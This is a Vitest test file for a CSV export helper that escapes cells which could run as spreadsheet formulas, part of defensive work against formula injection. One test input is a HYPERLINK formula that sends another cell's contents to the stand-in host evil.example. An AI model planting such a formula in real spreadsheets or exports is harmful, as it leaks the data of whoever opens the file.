/**
 * The CSV export carries text scraped from third-party careers pages into a spreadsheet, so a cell
 * must never be read as a formula, and ordinary values must come out exactly as they went in.
 */
import { describe, expect, it } from "vitest";
import { csvCell, csvRow, toCsv } from "./csv";

describe("csv cells", () => {
  it("writes a cell that would start a formula as text", () => {
    expect(csvCell("=1+1")).toBe("'=1+1");
    expect(csvCell("+44 20 7946 0000")).toBe("'+44 20 7946 0000");
    expect(csvCell("-2+3")).toBe("'-2+3");
    expect(csvCell("@SUM(A1:A2)")).toBe("'@SUM(A1:A2)");
    expect(csvCell("\t=1+1")).toBe("'\t=1+1");
    // Neutralised first, then quoted as usual: the quote is inside the field.
    expect(csvCell('=HYPERLINK("https://evil.example/?"&A2,"Apply")')).toBe(`"'=HYPERLINK(""https://evil.example/?""&A2,""Apply"")"`);
    expect(csvCell("\r=1+1")).toBe(`"'\r=1+1"`);
  });

  it("leaves numbers, including negative ones, and ordinary text alone", () => {
    expect(csvCell(-5)).toBe("-5");
    expect(csvCell(82)).toBe("82");
    expect(csvCell("Operations Manager")).toBe("Operations Manager");
    expect(csvCell("London, UK")).toBe('"London, UK"');
    expect(csvCell("https://job-boards.greenhouse.io/acme/jobs/1")).toBe("https://job-boards.greenhouse.io/acme/jobs/1");
    expect(csvCell("Head of Ops - EMEA")).toBe("Head of Ops - EMEA");
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
  });

  it("joins rows and lines the RFC 4180 way", () => {
    expect(csvRow(["a", "=b", 3])).toBe("a,'=b,3");
    expect(toCsv(["x", "y"], [["1", "2"]])).toBe("x,y\r\n1,2\r\n");
  });
});
